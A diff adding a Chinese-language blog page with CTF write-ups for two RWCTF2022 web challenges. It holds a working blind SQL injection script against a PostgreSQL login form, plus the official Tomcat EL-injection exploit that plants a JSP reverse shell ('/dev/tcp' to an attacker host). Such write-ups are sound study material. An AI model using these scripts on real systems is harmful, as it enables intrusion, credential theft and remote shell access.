@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="dark">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Siebene@" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      RWCTF2022-WriteUps 
+      
+      
+      |
+    
+     Siebene@ Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+  <!-- clipboard -->
+  
+    <script src="https://unpkg.com/clipboard@2/dist/clipboard.min.js"></script>
+    
+<script src="/js/codeCopy.js"></script>
+
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Siebene@</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">RWCTF2022-WriteUps</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-01-24 00:00:50
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/WP/" title="WP">
+                    <b>#</b> WP
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>赶紧学习</p>
+<h2 id="Hack-into-Skynet"><a href="#Hack-into-Skynet" class="headerlink" title="Hack into Skynet"></a>Hack into Skynet</h2><p>登录哪里非常明显的逻辑问题，可以任意密码登录,username置空就行</p>
+<p>之后就可以在name参数注入了</p>
+<p>注入还是比较好测的，主要是我测了下%00居然也可以在pgsql当注释符，做比赛的时候才知道。注入就比较简单了，我观察到像是一种正则匹配的规则，但不是纯文本的正则匹配。所以说尝试换一下注入的位置，试了下在offest这里可以绕</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.digits+string.ascii_letters+<span class="string">r&quot;$&#123;&#125;-_&quot;</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://47.242.21.212:8081/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;SessionId&quot;</span>: <span class="string">&quot;23d96ab50b7215421dd1c101be70d2e1&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.242.21.212:8081&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.242.21.212:8081/&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">		<span class="comment"># SELECT string_agg(table_name,&#x27;&#x27;) FROM information_schema.tables </span></span><br><span class="line">		<span class="comment"># current_setting(&#x27;is_superuser&#x27;)</span></span><br><span class="line">		<span class="comment"># data=&quot;(SELECT string_agg(table_name,&#x27;&#x27;) FROM information_schema.tables)&quot;</span></span><br><span class="line">		data = <span class="string">&quot;(select secret_key from target_credentials where account=&#x27;skynet&#x27;)&quot;</span></span><br><span class="line">		burp0_data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">f&quot;s&#x27; or 1::BOOLEAN OFFSET 0|(left(<span class="subst">&#123;data&#125;</span>,<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;)::integer\x00&quot;</span>&#125;</span><br><span class="line">		<span class="built_in">print</span>(burp0_data)</span><br><span class="line">		res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;john.connor&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			flag =flag+j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment"># PostgreSQL 13.5 on x86</span></span><br><span class="line"><span class="comment"># skynet eb0f4c3b032e72d6fdf908dfcfe4836c</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Desperate-Cat"><a href="#Desperate-Cat" class="headerlink" title="Desperate Cat"></a>Desperate Cat</h2><p>完全不会，看了一会等于什么都没做</p>
+<p>赛后看到wp，非常的顶，而且有几种做法</p>
+<p>预期解，这里是官方的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXIES = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target_url = sys.argv[<span class="number">1</span>]    <span class="comment"># e.g. http://47.243.235.228:39465/</span></span><br><span class="line">    reverse_shell_host = sys.argv[<span class="number">2</span>]</span><br><span class="line">    reverse_shell_port = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    el_payload = <span class="string">r&quot;&quot;&quot;$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span></span><br><span class="line"><span class="string">$&#123;sessionScope[param.b]=param.c&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable=true&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d&#125;&quot;&quot;&quot;</span></span><br><span class="line">    reverse_shell_jsp_payload = <span class="string">r&quot;&quot;&quot;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sh -i &gt;&amp; /dev/tcp/&quot;&quot;&quot;</span> + reverse_shell_host + <span class="string">&quot;/&quot;</span> + reverse_shell_port + <span class="string">r&quot;&quot;&quot; 0&gt;&amp;1&quot;&#125;);%&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                      data=&#123;</span><br><span class="line">                          <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jsp&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;content&#x27;</span>: el_payload,</span><br><span class="line">                      &#125;,</span><br><span class="line">                      proxies=PROXIES)</span><br><span class="line">    shell_path = r.text.strip().split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    shell_url = <span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export/<span class="subst">&#123;shell_path&#125;</span>&#x27;</span></span><br><span class="line">    r2 = requests.post(url=shell_url,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;/tmp/session.jsp&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;voidfyoo&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;c&#x27;</span>: reverse_shell_jsp_payload,</span><br><span class="line">                           <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    r3 = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;./WEB-INF/lib/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jar&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    time.sleep(<span class="number">10</span>)  <span class="comment"># wait a while</span></span><br><span class="line">    r4 = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/tmp/session.jsp&#x27;</span>, proxies=PROXIES)</span><br></pre></td></tr></table></figure>
+
+<p>基础还是很重要的，我完全不知道可以用el干这么骚的事情，我看那么多控制字符都没了都绝望好久了。</p>
+<p>简单解释一下<img src="/2022/01/24/RWCTF2022-WriteUps/1.png" alt="1"></p>
+<p>上面那段el首先是控制了一个文件内容，更改了appBase，热加载打开，然后触发</p>
+<p>还有一种非预期还在学习中</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/11/22/Latte-SSTI-Payloads%E6%80%BB%E7%BB%93/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-01-24 00:00:50
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/WP/" title="WP">
+                        <b>#</b> WP
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/04/10/JavaDeserializeLabs-Writeups(6-9)/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hack-into-Skynet"><span class="toc-text">Hack into Skynet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Desperate-Cat"><span class="toc-text">Desperate Cat</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Siebene">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/Siebene">Copyright © 2022 Siebene@</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/Siebene">Theme by Oranges</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + RWCTF2022-WriteUps + '&url=' + https%3A%2F%2Fsiebene.github.io%2F2022%2F01%2F24%2FRWCTF2022-WriteUps%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://siebene.github.io/2022/01/24/RWCTF2022-WriteUps/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
